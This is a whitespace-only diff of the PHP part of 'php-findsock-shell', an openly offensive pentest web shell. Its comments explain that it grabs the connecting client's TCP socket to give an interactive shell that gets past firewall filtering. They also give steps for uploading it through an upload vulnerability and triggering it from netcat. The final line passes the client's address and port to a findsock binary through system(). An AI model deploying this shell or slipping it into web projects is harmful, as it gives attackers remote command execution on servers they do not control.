@@ -1,4 +1,4 @@
-<?php 
+<?php
 // php-findsock-shell - A Findsock Shell implementation in PHP + C
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 //
@@ -27,9 +27,9 @@
 //
 // Description
 // -----------
-// (Pair of) Web server scripts that find the TCP socket being used by the 
-// client to connect to the web server and attaches a shell to it.  This 
-// provides you, the pentester, with a fully interactive shell even if the 
+// (Pair of) Web server scripts that find the TCP socket being used by the
+// client to connect to the web server and attaches a shell to it.  This
+// provides you, the pentester, with a fully interactive shell even if the
 // Firewall is performing proper ingress and egress filtering.
 //
 // Proper interactive shells are more useful than web-based shell in some
@@ -41,7 +41,7 @@
 // Limitations
 // -----------
 // The shell traffic doesn't look much like HTTP, so I guess that you may
-// have problems if the site is being protected by a Layer 7 (Application layer) 
+// have problems if the site is being protected by a Layer 7 (Application layer)
 // Firewall.
 //
 // The shell isn't fully implemented in PHP: you also need to upload a
@@ -67,7 +67,7 @@
 //    Bear in mind that the web server might be running a different OS / architecture to you.
 //
 // 2: Upload "php-findsock-shell.php" and "findsock" binary to the web server using
-//    whichever upload vulnerability you've indentified.  Both should be uploaded to the 
+//    whichever upload vulnerability you've indentified.  Both should be uploaded to the
 //    same directory.
 //
 // 3: Run the shell from a netcat session (NOT a browser - remember this is an
@@ -84,6 +84,6 @@
 //
 
 $VERSION = "1.0";
-system( "./findsock " . $_SERVER['REMOTE_ADDR'] . " " . $_SERVER['REMOTE_PORT'] ) 
+system("./findsock " . $_SERVER['REMOTE_ADDR'] . " " . $_SERVER['REMOTE_PORT'])
 ?>
 
